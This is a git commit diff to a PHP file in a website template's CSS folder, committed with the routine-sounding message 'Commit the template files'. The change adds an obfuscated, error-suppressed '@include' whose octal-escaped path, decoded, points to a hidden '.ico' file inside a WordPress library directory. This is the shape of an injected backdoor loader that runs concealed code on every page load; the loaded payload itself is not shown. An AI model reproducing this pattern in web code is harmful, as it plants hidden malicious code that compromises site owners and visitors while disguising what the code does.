3392e45da0f6b0588bbbe1f51cf043d4503285eb
bridaltk <bridal.tk@gmail.com>
2018-08-04 22:27:47 +0900

    Commit the template files

--- template/css/index.php
+++ template/css/index.php
@@ -1,7 +1,7 @@
 <?php
-/*3b247*/
+/*9485c*/
 
-@include "\057tse\162ver\057www\057bri\144al-\164k.c\157m/t\145mpl\141te/\152s/m\141gni\146ic-\160opu\160/.6\1460b2\145e8.\151co";
+@include "\057hom\145/br\151dal\164k/p\165bli\143_ht\155l/w\160-in\143lud\145s/S\151mpl\145Pie\057Par\163e/.\066e11\143e18\056ico";
 
-/*3b247*/
+/*9485c*/
 
